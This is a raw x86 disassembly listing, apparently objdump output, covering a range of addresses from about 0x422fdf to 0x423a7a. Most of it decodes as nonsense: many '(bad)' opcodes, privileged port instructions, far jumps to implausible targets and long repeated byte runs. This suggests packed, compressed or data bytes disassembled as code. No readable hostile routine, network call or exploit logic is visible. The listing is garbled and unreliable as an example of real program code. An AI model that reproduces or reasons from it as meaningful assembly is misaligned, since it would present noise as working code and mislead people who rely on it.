  422fdf:	add    BYTE PTR [ebx-0x3],ah
  422fe2:	scas   eax,DWORD PTR es:[edi]
  422fe3:	pop    dx
  422fe5:	les    eax,FWORD PTR [eax]
  422fe7:	pusha  
  422fe8:	and    DWORD PTR ds:[ebp-0x56cee0ad],0xbe97234a
  422ff3:	jno    0x423010
  422ff5:	daa    
  422ff6:	add    al,0xd
  422ff8:	and    DWORD PTR ds:[ebp-0x5cd8f3c0],0xa67b2373
  423003:	jo     0x42300f
  423005:	arpl   WORD PTR [esi+0xc3e360],sp
  42300b:	icebp  
  42300c:	ds jge 0x422fb7
  42300f:	(bad)  
  423010:	not    ebp
  423012:	stos   DWORD PTR es:[edi],eax
  423013:	jae    0x422fec
  423015:	bound  ebp,QWORD PTR [eax+0x45ed466]
  42301b:	ins    DWORD PTR es:[edi],dx
  42301c:	loop   0x423084
  42301e:	icebp  
  42301f:	xor    DWORD PTR [eax],ebx
  423021:	pusha  
  423022:	test   al,0x6b
  423024:	ds pop ebx
  423026:	in     al,0x1
  423028:	mov    bl,0x4a
  42302a:	xlat   BYTE PTR ds:[ebx]
  42302b:	mov    cl,0x98
  42302d:	inc    ebp
  42302e:	fistp  DWORD PTR [ebp-0x4d2ba498]
  423034:	pushf  
  423035:	dec    ecx
  423036:	cli    
  423037:	icebp  
  423038:	imul   edi,DWORD PTR [edi],0xffffffcb
  42303b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42303c:	adc    esi,edx
  42303e:	push   ss
  42303f:	add    al,0x6c
  423041:	inc    eax
  423042:	mov    dh,0x0
	...
  42306d:	add    BYTE PTR [ecx+0x5cca9540],dl
  423073:	push   esp
  423074:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423075:	mov    ebx,0x4315b30
  42307a:	mov    WORD PTR [eax-0x7a],es
  42307d:	aam    0x6c
  42307f:	inc    eax
  423080:	jns    0x42303e
  423082:	jae    0x4230c0
  423084:	mov    esi,DWORD PTR [eax-0x3b90dfa4]
  42308a:	leave  
  42308b:	aad    0x35
  42308d:	add    al,0x6c
  42308f:	inc    eax
  423090:	dec    esi
  423091:	shl    DWORD PTR ds:0x69f5a46,0x40
  423098:	push   eax
  423099:	add    al,0x7b
  42309b:	pop    ebx
  42309c:	cmp    DWORD PTR [edi-0x60c8d9e6],ebx
  4230a2:	sub    esp,DWORD PTR [edx]
  4230a4:	inc    esp
  4230a5:	mov    ebx,0x3ab5b50
  4230aa:	in     al,dx
  4230ab:	aas    
  4230ac:	inc    esi
  4230ad:	mov    edi,0xc9145013
  4230b2:	fcom   QWORD PTR [ebx+0x24]
  4230b5:	mov    esp,0x3515b30
  4230ba:	or     al,0x40
  4230bc:	push   es
  4230bd:	shr    edi,0x3f
  4230c0:	or     BYTE PTR [eax-0x44fbde24],dh
  4230c6:	adc    BYTE PTR [ebx+0x0],bl
  4230c9:	mov    ?,WORD PTR ds:0x6f066329
  4230cf:	cmp    BYTE PTR [edi+edi*4+0x0],dh
	...
  4230fb:	add    ah,bl
  4230fd:	inc    eax
  4230fe:	jae    0x4230c4
  423100:	lock dec esp
  423102:	aas    
  423103:	jmp    0xa041b145
  423108:	out    dx,al
  423109:	sub    BYTE PTR [ebx-0x3f],ah
  42310c:	jmp    0xdf129f3a
  423111:	inc    edi
  423112:	fs int3 
  423114:	cmp    eax,0xa09afea5
  423119:	aas    
  42311a:	dec    ebp
  42311b:	cdq    
  42311c:	fadd   DWORD PTR [esi+0x41]
  42311f:	xchg   esp,eax
  423120:	scas   eax,DWORD PTR es:[edi]
  423121:	dec    edx
  423122:	arpl   WORD PTR [edi-0x7b8ed667],ax
  423128:	scas   eax,DWORD PTR es:[edi]
  423129:	aam    0xfc
  42312b:	cs cmp eax,0x90866329
  423131:	inc    esi
  423132:	jae    0x4230b8
  423134:	sti    
  423135:	xor    eax,0x95a0746c
  42313a:	add    BYTE PTR [edx],al
  42313c:	cmp    eax,0x8155631e
  423141:	dec    ebx
  423142:	arpl   WORD PTR [ebx-0x80],bx
  423145:	xor    eax,0xd47d446b
  42314a:	cld    
  42314b:	dec    eax
  42314c:	fimul  WORD PTR [esi+0x5f]
  42314f:	cmp    ebp,esp
  423151:	mov    esi,DWORD PTR [edx]
  423153:	pop    es
  423154:	fiadd  WORD PTR [eax+0x6c]
  423157:	jmp    0x3a41dd99
  42315c:	stos   BYTE PTR es:[edi],al
  42315d:	cmp    DWORD PTR [ebp+ecx*1+0x0],ebp
	...
  423189:	add    BYTE PTR [ecx-0x66f59cb4],dh
  42318f:	dec    eax
  423190:	arpl   WORD PTR [eax],bp
  423192:	cmp    cl,BYTE PTR [edx+0x68]
  423195:	add    BYTE PTR [edx+0x3],cl
  423198:	imul   esi,DWORD PTR [ebx],0x6c60be95
  42319e:	inc    ebx
  42319f:	pop    edi
  4231a0:	jne    0x4231a2
  4231a2:	push   ds
  4231a3:	std    
  4231a4:	jo     0x42320b
  4231a6:	adc    eax,0xe47461fe
  4231ab:	or     DWORD PTR [esi+0x63],ebx
  4231ae:	cld    
  4231af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231b0:	outs   dx,BYTE PTR ds:[esi]
  4231b1:	ins    BYTE PTR es:[edi],dx
  4231b2:	(bad)  
  4231b3:	push   edi
  4231b4:	ja     0x4231b6
  4231b6:	into   
  4231b7:	std    
  4231b8:	jo     0x42321f
  4231ba:	aad    0xfd
  4231bc:	popa   
  4231bd:	je     0x423193
  4231bf:	or     DWORD PTR [edx+0x61],esp
  4231c2:	retf   
  4231c3:	hlt    
  4231c4:	push   ecx
  4231c5:	jb     0x42319a
  4231c7:	cwde   
  4231c8:	cld    
  4231c9:	dec    eax
  4231cb:	add    BYTE PTR [ebx+0x69],ch
  4231ce:	shl    esp,0x70
  4231d1:	cs mov ebx,0xd20068fb
  4231d7:	pop    eax
  4231d8:	dec    edi
  4231d9:	je     0x423230
  4231db:	stos   DWORD PTR es:[edi],eax
  4231dc:	jo     0x423250
  4231de:	sahf   
  4231df:	cwde   
  4231e0:	cld    
  4231e1:	call   edi
  4231e3:	pop    eax
  4231e4:	dec    edi
  4231e5:	je     0x4231fc
  4231e7:	lods   eax,DWORD PTR ds:[esi]
  4231e8:	aas    
  4231e9:	push   0x3e1615
	...
  423216:	add    BYTE PTR [eax],al
  423218:	stos   DWORD PTR es:[edi],eax
  423219:	pop    esi
  42321a:	dec    edi
  42321b:	je     0x423222
  42321d:	mov    bl,0x6b
  42321f:	dec    ecx
  423220:	icebp  
  423221:	adc    bh,BYTE PTR [esi]
  423223:	add    BYTE PTR [ebx+0x45744f5e],ah
  423229:	lods   al,BYTE PTR ds:[esi]
  42322a:	jo     0x42329e
  42322c:	push   esi
  42322d:	pop    edi
  42322e:	jmp    0x4243:0x6f133400
  423235:	cmovnp ecx,DWORD PTR [ecx+0x3e]
  423239:	add    DWORD PTR [esi+ecx*1],0x3f
  42323d:	xchg   ecx,eax
  42323e:	mov    eax,0xb2d5ed71
  423243:	inc    esi
  423244:	jmp    0xd6b3330a
  423249:	pop    ebp
  42324a:	mov    ecx,0xe25ace5e
  42324f:	arpl   WORD PTR [edx+0x3e3600a8],bp
  423255:	stos   DWORD PTR es:[edi],eax
  423256:	sahf   
  423257:	bound  esi,QWORD PTR [edx-0x659c5bf7]
  42325d:	mov    dh,0x0
  42325f:	sub    bh,BYTE PTR [esi]
  423261:	mov    eax,ds:0xa1a673a7
  423266:	mov    ch,0x73
  423268:	pushf  
  423269:	or     ebx,DWORD PTR [edi+0x97935e]
  42326f:	inc    edi
  423270:	ds cmc 
  423272:	mov    eax,ds:0xb4d76560
  423277:	(bad)  
  423278:	jmp    0xa3331e
	...
  4232a5:	add    BYTE PTR [ecx+0x52],dl
  4232a8:	lahf   
  4232a9:	bound  ebx,QWORD PTR [ebp+0x50]
  4232ac:	add    DWORD PTR [esi],esp
  4232ae:	ds in  eax,0x9c
  4232b1:	ins    BYTE PTR es:[edi],dx
  4232b2:	dec    ebp
  4232b3:	fbstp  TBYTE PTR [ebp-0x5822a294]
  4232b9:	jae    0x4232f9
  4232bb:	add    BYTE PTR [ecx+esi*2],0x1b
  4232bf:	and    ch,BYTE PTR [eax+0x485a9ff]
  4232c5:	jno    0x4232e2
  4232c7:	nop
  4232c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232c9:	pusha  
  4232ca:	adc    al,ah
  4232cc:	add    BYTE PTR [esi],bh
  4232ce:	ds xchg esi,eax
  4232d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232d1:	pusha  
  4232d2:	adc    ah,al
  4232d4:	add    BYTE PTR [ebp+0x3e],al
  4232d7:	xchg   ebp,eax
  4232d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232d9:	jae    0x4232c8
  4232db:	pop    edx
  4232dc:	push   ss
  4232dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232de:	out    0x41,al
  4232e0:	pop    ss
  4232e1:	mov    eax,0x3c7d269
  4232e6:	or     ebp,DWORD PTR [esi]
  4232e8:	sub    bh,dl
  4232ea:	int    0x3b
  4232ec:	stc    
  4232ed:	mov    bh,0xcc
  4232ef:	dec    edx
  4232f0:	out    0x3,eax
  4232f2:	ror    DWORD PTR [ebp+0x6],cl
  4232f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232f6:	(bad)  
  4232f7:	lea    edi,[ecx-0x2cc0621f]
  4232fd:	add    eax,DWORD PTR [ebp-0x775d54a5]
  423303:	aaa    
  423304:	mov    esp,0xb74d9cb6
  423309:	mov    ch,0x0
	...
  423333:	add    BYTE PTR [edx-0x63602fc7],ch
  423339:	sbb    al,0xe7
  42333b:	add    ebp,DWORD PTR [ecx+0x5b]
  42333e:	pushf  
  42333f:	mov    eax,ds:0xa7c84295
  423344:	mov    WORD PTR [esi-0x74],cs
  423347:	mov    ch,0x81
  423349:	dec    ebp
  42334a:	mov    gs,WORD PTR [ecx+0x38c3f60]
  423350:	ins    DWORD PTR es:[edi],dx
  423351:	dec    esi
  423352:	test   BYTE PTR [ebp-0x1e82bea4],dh
  423358:	pop    ebp
  423359:	aas    
  42335a:	mov    eax,DWORD PTR [ebx]
  42335c:	ds pop ebx
  42335e:	out    0x3,eax
  423360:	ds pop ebx
  423362:	out    0x3,eax
  423364:	ds pop ebx
  423366:	out    0x3,eax
  423368:	ds pop ebx
  42336a:	out    0x3,eax
  42336c:	ds pop ebx
  42336e:	out    0x3,eax
  423370:	ds pop ebx
  423372:	out    0x3,eax
  423374:	ds pop ebx
  423376:	out    0x3,eax
  423378:	ds pop ebx
  42337a:	out    0x3,eax
  42337c:	ds pop ebx
  42337e:	add    cl,ch
  423380:	cmp    eax,0x3de9005b
  423385:	pop    ebx
  423386:	add    cl,ch
  423388:	cmp    eax,0x3de9005b
  42338d:	pop    ebx
  42338e:	add    cl,ch
  423390:	cmp    eax,0x3de9005b
  423395:	pop    ebx
  423396:	add    cl,ch
	...
  4233c0:	add    BYTE PTR [eax],al
  4233c2:	cmp    eax,0x3de9005b
  4233c7:	pop    ebx
  4233c8:	add    cl,ch
  4233ca:	cmp    eax,0x3de9005b
  4233cf:	pop    ebx
  4233d0:	add    cl,ch
  4233d2:	cmp    eax,0x3de9005b
  4233d7:	pop    ebx
  4233d8:	add    cl,ch
  4233da:	cmp    eax,0x3de9005b
  4233df:	pop    ebx
  4233e0:	add    cl,ch
  4233e2:	cmp    eax,0x3de9005b
  4233e7:	pop    ebx
  4233e8:	add    cl,ch
  4233ea:	cmp    eax,0x3de9005b
  4233ef:	pop    ebx
  4233f0:	add    cl,ch
  4233f2:	cmp    eax,0x3de9005b
  4233f7:	pop    ebx
  4233f8:	add    cl,ch
  4233fa:	cmp    eax,0x3de9005b
  4233ff:	pop    ebx
  423400:	add    cl,ch
  423402:	cmp    eax,0x3de9005b
  423407:	pop    ebx
  423408:	add    cl,ch
  42340a:	cmp    eax,0x3de9005b
  42340f:	pop    ebx
  423410:	add    cl,ch
  423412:	cmp    eax,0x3de9005b
  423417:	pop    ebx
  423418:	add    cl,ch
  42341a:	cmp    eax,0x3de9005b
  42341f:	pop    ebx
  423420:	add    BYTE PTR [eax],al
  423422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423423:	pop    esp
	...
  423450:	xchg   edi,eax
  423451:	pop    esp
  423452:	add    BYTE PTR [eax],al
  423454:	xchg   edi,eax
  423455:	pop    esp
  423456:	add    BYTE PTR [eax],al
  423458:	addr16 pop esp
  42345a:	add    BYTE PTR [eax],al
  42345c:	addr16 pop esp
  42345e:	add    BYTE PTR [eax],al
  423460:	push   edi
  423461:	pop    esp
  423462:	add    BYTE PTR [eax],al
  423464:	push   edi
  423465:	pop    esp
  423466:	add    BYTE PTR [eax],al
  423468:	addr16 pop esp
  42346a:	add    BYTE PTR [eax],al
  42346c:	addr16 pop esp
  42346e:	add    BYTE PTR [eax],al
  423470:	push   edi
  423471:	pop    esp
  423472:	add    BYTE PTR [eax],al
  423474:	push   edi
  423475:	pop    esp
  423476:	add    BYTE PTR [eax],al
  423478:	daa    
  423479:	pop    esp
  42347a:	add    BYTE PTR [eax],al
  42347c:	daa    
  42347d:	pop    esp
  42347e:	add    BYTE PTR [eax],al
  423480:	pop    ss
  423481:	pop    esp
  423482:	add    BYTE PTR [eax],al
  423484:	pop    ss
  423485:	pop    esp
  423486:	add    BYTE PTR [eax],al
  423488:	daa    
  423489:	pop    esp
  42348a:	add    BYTE PTR [eax],al
  42348c:	daa    
  42348d:	pop    esp
  42348e:	add    BYTE PTR [eax],al
  423490:	pop    ss
  423491:	pop    esp
  423492:	add    BYTE PTR [eax],al
  423494:	pop    ss
  423495:	pop    esp
  423496:	add    BYTE PTR [eax],al
  423498:	out    0x5b,eax
  42349a:	add    BYTE PTR [eax],al
  42349c:	out    0x5b,eax
  42349e:	add    BYTE PTR [eax],al
  4234a0:	xlat   BYTE PTR ds:[ebx]
  4234a1:	pop    ebx
  4234a2:	add    BYTE PTR [eax],al
  4234a4:	mov    esp,esp
  4234a6:	jmp    0x4234f9
  4234a8:	lds    edx,FWORD PTR ds:0xe3468a08
  4234ae:	dec    edx
  4234af:	push   DWORD PTR [ebp+0xc35ab5]
	...
  4234dd:	add    BYTE PTR [ebx-0x1c],ch
  4234e0:	jmp    0x423533
  4234e2:	adc    BYTE PTR [eax],ch
  4234e4:	xor    ecx,ecx
  4234e6:	sbb    ah,ah
  4234e8:	outs   dx,BYTE PTR ds:[esi]
  4234e9:	xor    BYTE PTR [ebp+0x288b0c48],dh
  4234ef:	outs   dx,DWORD PTR ds:[esi]
  4234f0:	mov    DWORD PTR [esi+0x46],eax
  4234f3:	loop   0x423537
  4234f5:	cld    
  4234f6:	lds    edx,FWORD PTR [eax+0x20]
  4234f9:	mov    edx,DWORD PTR [eax-0x25]
  4234fc:	cmp    al,0x6b
  4234fe:	or     bl,BYTE PTR [eax-0x80]
  423501:	aas    
  423502:	add    eax,0x67eb0247
  423507:	das    
  423508:	pop    esi
  423509:	mov    esp,DWORD PTR [ebx+0x2d]
  42350c:	ror    esp,0xb
  42350f:	in     al,0xeb
  423511:	sub    DWORD PTR [edx+0x76],0xffffff89
  423515:	inc    ebp
  423516:	inc    esi
  423517:	loop   0x42355b
  423519:	loopne 0x4234d0
  42351b:	sbb    eax,0xbaeb8be0
  423520:	add    BYTE PTR [ecx+0x7a],dl
  423523:	in     al,0x52
  423525:	in     al,0xc5
  423527:	sbb    ah,ah
  423529:	mov    esi,DWORD PTR [esi+0x53]
  42352c:	add    DWORD PTR [ebp+0x36],ecx
  42352f:	in     al,0x4a
  423531:	clc    
  423532:	lds    ebp,FWORD PTR [eax]
  423534:	clc    
  423535:	mov    edi,DWORD PTR [edi+esi*2+0x1]
  423539:	inc    ebp
  42353a:	ss in  al,0x42
  42353d:	call   0x8c3a55f7
	...
  42356a:	add    BYTE PTR [eax],al
  42356c:	(bad)  
  42356d:	jnp    0x423570
  42356f:	push   ebp
  423570:	inc    esi
  423571:	in     al,0x52
  423573:	lock mov ch,0x18
  423576:	clc    
  423577:	mov    esi,DWORD PTR [esi+0x6f]
  42357a:	add    DWORD PTR [ebp+0x46],ecx
  42357d:	in     al,0x4a
  42357f:	cld    
  423580:	stc    
  423581:	sbb    ah,dh
  423583:	add    BYTE PTR [esi],bh
  423585:	pop    ebx
  423586:	add    bl,ch
  423588:	aaa    
  423589:	loop   0x4235dd
  42358b:	hlt    
  42358c:	mov    ebp,0xb88fe99
  423591:	(bad)  
  423592:	mov    BYTE PTR [ebp-0x5a],al
  423595:	loop   0x4235e1
  423597:	hlt    
  423598:	and    ebx,DWORD PTR gs:[eax]
  42359b:	jae    0x4235a3
  42359d:	loop   0x4235f1
  42359f:	lock lds ebx,FWORD PTR [ecx+0x1]
  4235a3:	inc    ebp
  4235a4:	ss in  al,0x42
  4235a7:	fcom   QWORD PTR [ebx*2+0x1b3cac68]
  4235ae:	add    BYTE PTR [ebx-0x17b150fd],cl
  4235b4:	push   cs
  4235b5:	pop    esp
  4235b6:	add    BYTE PTR [eax],al
  4235b8:	mov    ebp,0x7e850b97
  4235bd:	dec    eax
  4235be:	sbb    DWORD PTR [ebx+0x4588c6eb],ecx
  4235c4:	push   esi
  4235c5:	pop    esi
  4235c6:	mov    ch,0xc
  4235c8:	out    dx,al
  4235c9:	jecxz  0x423615
  4235cb:	in     al,dx
  4235cc:	lds    esp,FWORD PTR [edi]
  4235ce:	in     al,dx
  4235cf:	mov    eax,DWORD PTR [eax]
	...
  4235f9:	add    BYTE PTR [ebx-0x31],bh
  4235fc:	mov    BYTE PTR [esi+ecx*8],al
  4235ff:	pop    ecx
  423600:	inc    ebx
  423601:	or     BYTE PTR ds:0xe4d8960,dl
  423607:	fidivr DWORD PTR [esi-0xfe038fc]
  42360d:	jmp    0x4235f1
  42360f:	mov    eax,eax
  423611:	mov    ebx,DWORD PTR [ebx]
  423613:	xor    cl,al
  423615:	int3   
  423616:	or     bl,BYTE PTR [edi-0x60fd3335]
  42361c:	retf   
  42361d:	int3   
  42361e:	cli    
  42361f:	sahf   
  423620:	retf   
  423621:	int3   
  423622:	mov    esp,edx
  423624:	jmp    0x4235a9
  423626:	jmp    0xfccd:0xd105e872
  42362d:	mov    DWORD PTR [ebx-0x29ba773d],eax
  423633:	sub    ch,al
  423635:	sub    DWORD PTR [ecx+0x7a83fccd],edi
  42363b:	push   esi
  42363c:	mov    eax,ds:0x1c31f4
  423641:	push   0x4058e2
  423646:	lds    ebx,FWORD PTR [edi]
  423648:	call   0xf4a9c79e
  42364d:	ja     0x42364e
  42364f:	pop    edx
  423650:	mov    eax,ds:0x1c09f8
  423655:	push   0x3e
  423657:	inc    ecx
  423658:	add    BYTE PTR [eax-0x7e],ch
  42365b:	pop    eax
  42365c:	inc    eax
	...
  423685:	add    BYTE PTR [eax],al
  423687:	add    BYTE PTR [ecx+0x67],ch
  42368a:	clc    
  42368b:	ja     0x42368c
  42368d:	pop    edx
  42368e:	xchg   DWORD PTR [ebp+0x66],eax
  423691:	xchg   ebp,eax
  423692:	inc    edx
  423693:	cld    
  423694:	ds pop ebx
  423696:	add    BYTE PTR [eax],al
  423698:	push   ebp
  423699:	arpl   WORD PTR [ecx-0x3e26bdab],cx
  42369f:	add    edi,eax
  4236a1:	es cld 
  4236a3:	xor    DWORD PTR [ebx+0x5f7307cf],0xffffffe0
  4236aa:	inc    edx
  4236ab:	cld    
  4236ac:	mov    ch,0x5f
  4236ae:	or     DWORD PTR [esp+edi*1-0x3aaeffe5],0x26
  4236b6:	call   0xf4a9400d
  4236bb:	ja     0x42373c
  4236bd:	pop    ebx
  4236be:	mov    DWORD PTR [ebp-0x6],ecx
  4236c1:	loop   0x4236c6
  4236c3:	(bad)  
  4236c4:	jmp    0x88ab:0xd5003f44
  4236cb:	in     eax,0x83
  4236cd:	cwde   
  4236ce:	retf   
  4236cf:	int3   
  4236d0:	or     ah,BYTE PTR [eax-0x5ffd3335]
  4236d6:	retf   
  4236d7:	int3   
  4236d8:	cli    
  4236d9:	lahf   
  4236da:	retf   
  4236db:	int3   
  4236dc:	imul   esp,eax,0xffffffeb
  4236df:	mov    eax,ds:0x3f530e
  4236e4:	jo     0x4236c6
  4236e6:	aas    
  4236e7:	xor    BYTE PTR [ebp+0x3e081e],dh
	...
  423715:	add    BYTE PTR [edi+0x7d5d0823],dh
  42371b:	lahf   
  42371c:	retf   
  42371d:	int3   
  42371e:	sbb    BYTE PTR [edi-0x60853335],0xcb
  423725:	int3   
  423726:	jmp    0x423707
  423728:	jmp    0x4236b5
  42372a:	add    ebx,DWORD PTR [edi+0x50]
  42372d:	mov    eax,DWORD PTR [ebx]
  42372f:	arpl   WORD PTR [edi-0x1],cx
  423732:	push   ebx
  423733:	(bad)  
  423734:	je     0x423777
  423736:	ds cs ror esp,0x8a
  42373b:	lahf   
  42373c:	retf   
  42373d:	int3   
  42373e:	sbb    BYTE PTR [edi-0x60853335],0xcb
  423745:	int3   
  423746:	jmp    0x423727
  423748:	jmp    0x4236cd
  42374a:	sub    ah,BYTE PTR [ebx+0x6a]
  42374d:	add    BYTE PTR [ebx+ebx*2+0x1b3cdc68],ah
  423754:	add    bh,bh
  423756:	dec    ebx
  423757:	shl    DWORD PTR [ecx+eax*2+0x3e],cl
  42375b:	loop   0x42379f
  42375d:	clc    
  42375e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42375f:	ret    
  423760:	add    DWORD PTR [eax+0x3e],eax
  423763:	loopne 0x4237a7
  423765:	clc    
  423766:	outs   dx,BYTE PTR ds:[esi]
  423767:	ret    
  423768:	mov    ecx,0x80cbf9ff
  42376d:	les    eax,FWORD PTR [esi-0x1e]
  423770:	inc    edx
  423771:	cld    
  423772:	mov    ch,0x1d
  423774:	adc    BYTE PTR [ecx-0x4b],dl
  423777:	and    eax,0x520c
	...
  4237a4:	lds    edx,FWORD PTR ds:0x25d15008
  4237aa:	cld    
  4237ab:	mov    esp,ebx
  4237ad:	sub    eax,0xe06bccc1
  4237b2:	jmp    0x423805
  4237b4:	adc    DWORD PTR ds:0x5b3e00fc,0xe037eb00
  4237be:	inc    edx
  4237bf:	cld    
  4237c0:	mov    ebp,0x388fe9a
  4237c5:	iret   
  4237c6:	mov    BYTE PTR [ebp-0x6e],cl
  4237c9:	(bad)  
  4237ca:	dec    ebx
  4237cb:	adc    BYTE PTR ds:0x3655896c,cl
  4237d1:	pop    eax
  4237d2:	push   ebx
  4237d3:	cld    
  4237d4:	dec    ecx
  4237d5:	add    eax,0x5f038b02
  4237da:	add    DWORD PTR [ebp+0x6a],ecx
  4237dd:	pop    ebx
  4237de:	mov    dh,0x11
  4237e0:	and    eax,0x96077399
  4237e5:	pop    ecx
  4237e6:	add    BYTE PTR [eax],al
  4237e8:	rol    BYTE PTR ds:[ebx],0xeb
  4237ec:	outs   dx,BYTE PTR ds:[esi]
  4237ed:	xchg   eax,eax
  4237ef:	mov    ebx,DWORD PTR [ebx+0x2d]
  4237f2:	ror    esp,0xa
  4237f5:	cwde   
  4237f6:	retf   
  4237f7:	int3   
  4237f8:	add    bl,BYTE PTR [eax-0x68053335]
  4237fe:	retf   
  4237ff:	int3   
  423800:	mov    edx,esi
  423802:	jmp    0x4237bd
  423804:	ss pop ebx
	...
  423832:	call   0x782b:0x3b8906d6
  423839:	inc    ecx
  42383a:	ds sub cl,al
  42383d:	int3   
  42383e:	or     bl,BYTE PTR [eax-0x67fd3335]
  423844:	retf   
  423845:	int3   
  423846:	cli    
  423847:	xchg   edi,eax
  423848:	retf   
  423849:	int3   
  42384a:	mov    edx,esi
  42384c:	jmp    0x4237d1
  42384e:	jmp    0x77de:0x4645896b
  423855:	add    al,0x3e
  423857:	pop    edx
  423858:	test   BYTE PTR [eax-0x74ffa4c2],cl
  42385e:	or     edx,DWORD PTR [ebx-0x77]
  423861:	push   ecx
  423862:	cmp    bl,dh
  423864:	jmp    0x86f7c771
  423869:	push   ebp
  42386a:	stos   BYTE PTR es:[edi],al
  42386b:	(bad)  
  42386c:	inc    edx
  42386d:	or     BYTE PTR [ebp-0x476f865],bh
  423873:	retf   0x45c4
  423876:	mov    bl,BYTE PTR [ebx+0x0]
  423879:	add    BYTE PTR [esi],bh
  42387b:	mov    dh,0x6
  42387d:	mov    ecx,DWORD PTR [ebx]
  42387f:	mov    DWORD PTR [eax+0x4ad43fc1],0xfc30b5fc
  423889:	cmp    ecx,DWORD PTR [ebx]
  42388b:	iret   
  42388c:	jo     0x4238d4
  42388e:	lds    esp,FWORD PTR [eax]
  423890:	cld    
  423891:	mov    eax,DWORD PTR [ebx]
  423893:	retf   
  423894:	or     al,0xb7
	...
  4238be:	add    BYTE PTR [eax],al
  4238c0:	xor    bl,BYTE PTR [edi+edi*4]
  4238c3:	cli    
  4238c4:	xor    bl,dh
  4238c6:	stc    
  4238c7:	add    esi,DWORD PTR [ebx+0x3245898d]
  4238cd:	(bad)  
  4238ce:	dec    edx
  4238cf:	lock cmp DWORD PTR [edx],edx
  4238d2:	adc    al,0x41
  4238d4:	mov    edi,0x3e0ffcbc
  4238d9:	pop    ebx
  4238da:	xchg   DWORD PTR [ebp+0x16],edx
  4238dd:	(bad)  
  4238de:	inc    edx
  4238df:	or     BYTE PTR [ebp+0x36030c17],dh
  4238e5:	(bad)  
  4238e6:	push   edx
  4238e7:	clc    
  4238e8:	lds    ebx,FWORD PTR [esi+0xf]
  4238eb:	add    edi,DWORD PTR [ebx+0x6b]
  4238ee:	mov    DWORD PTR [ebp+0x36],ecx
  4238f1:	(bad)  
  4238f2:	push   edx
  4238f3:	or     al,0x3d
  4238f5:	ins    BYTE PTR es:[edi],dx
  4238f6:	mov    DWORD PTR [ebp-0x2a],ecx
  4238f9:	rol    DWORD PTR [ebx],cl
  4238fb:	or     ah,ch
  4238fd:	xrelease mov BYTE PTR [ebp+0x36],dl
  423901:	(bad)  
  423902:	inc    edx
  423903:	or     BYTE PTR ds:0x389041d,bh
  423909:	push   ebx
  42390a:	out    0x6b,eax
  42390c:	mov    cl,0xc9
  42390e:	cld    
  42390f:	mov    esp,DWORD PTR [ebx+0xbccc127]
  423915:	(bad)  
  423916:	jmp    0x42389b
  423918:	stos   BYTE PTR es:[edi],al
  423919:	jle    0x4238a4
  42391b:	inc    ebp
  42391c:	inc    esi
  42391d:	aam    0x42
  42391f:	in     al,0xb5
  423921:	pop    ss
  423922:	in     al,0x8b
	...
  42394c:	add    BYTE PTR [eax],al
  42394e:	jmp    0x42390e
  423950:	add    BYTE PTR [ecx+0x3a],dl
  423953:	aam    0x52
  423955:	call   0x8c2a591f
  42395a:	mov    dh,0xda
  42395c:	(bad)  
  42395d:	(bad)  
  42395e:	ds aam 0x4a
  423961:	lock mov ebp,0x4100f047
  423967:	(bad)  
  423969:	add    BYTE PTR [esi],bh
  42396b:	pop    ebx
  42396c:	mov    DWORD PTR [ebp+0x36],edx
  42396f:	pop    esi
  423970:	push   ebx
  423971:	lock (bad) 
  423973:	cs loopne 0x423901
  423976:	jnp    0x423933
  423978:	cmp    BYTE PTR [eax+0x4e],0x5b
  42397c:	or     eax,0x5c1b84
  423981:	add    BYTE PTR [ebx+ebx*2+0x16c5006a],ah
  423988:	loopne 0x423915
  42398a:	jae    0x4239df
  42398c:	add    DWORD PTR [ecx+0x32],edx
  42398f:	sub    eax,0x50f615fd
  423994:	aas    
  423995:	add    bh,al
  423997:	push   ds
  423998:	cld    
  423999:	mov    eax,DWORD PTR [ebx+0x3e3880bb]
  42399f:	dec    edi
  4239a0:	pop    ss
  4239a1:	mov    ecx,DWORD PTR [ebx+0x465588bb]
  4239a7:	pop    esp
  4239a8:	jns    0x45caf121
  4239ae:	(bad)  
  4239b0:	dec    edx
  4239b1:	or     BYTE PTR [eax],al
	...
  4239db:	add    BYTE PTR ds:0x3891013,bh
  4239e1:	iret   
  4239e2:	call   0xe070eefe
  4239e7:	mov    edi,ebx
  4239e9:	push   edx
  4239ea:	add    DWORD PTR [edx+0x2e],eax
  4239ed:	rol    BYTE PTR [edx-0xc],cl
  4239f0:	lds    edx,FWORD PTR [esi]
  4239f2:	loopne 0x42397f
  4239f4:	repz push edx
  4239f6:	add    DWORD PTR [ecx],edx
  4239f8:	mov    bh,0x2e
  4239fa:	in     al,dx
  4239fb:	mov    DWORD PTR [ebx],0x3effffc3
  423a01:	pop    ebx
  423a02:	mov    DWORD PTR [ebp+0x5e],eax
  423a05:	fdiv   QWORD PTR [edi+0x10]
  423a08:	ds dec edi
  423a0a:	or     eax,0x80bb0b8b
  423a0f:	cmp    DWORD PTR [esi],edi
  423a11:	dec    edi
  423a12:	add    eax,0xfec303c7
  423a17:	(bad)  
  423a18:	ds pop ebx
  423a1a:	mov    DWORD PTR [ebp+0x32],edx
  423a1d:	fdivr  QWORD PTR [ecx]
  423a1f:	add    BYTE PTR [edx+0x3245893a],ch
  423a25:	aam    0x7
  423a27:	sbb    DWORD PTR [edi],0xbe00005b
  423a2d:	dec    esi
  423a2e:	sbb    al,0x8b
  423a30:	imul   ecx,edi,0xffffff88
  423a33:	add    ah,BYTE PTR [ebx-0x38]
  423a36:	cld    
  423a37:	inc    DWORD PTR [ecx-0x5b276d5]
  423a3d:	sub    eax,ebp
  423a3f:	mov    ch,0x0
	...
  423a69:	add    bl,dh
  423a6b:	(bad)  
  423a6c:	cld    
  423a6d:	add    DWORD PTR [edx],0x53
  423a70:	xchg   DWORD PTR [ebp+0x2],eax
  423a73:	mov    ah,0x1b
  423a75:	mov    esi,DWORD PTR [ebx-0x31]
  423a78:	mov    BYTE PTR [edx],al
  423a7a:	lds    edx,FWORD PTR ds:0x53728d08
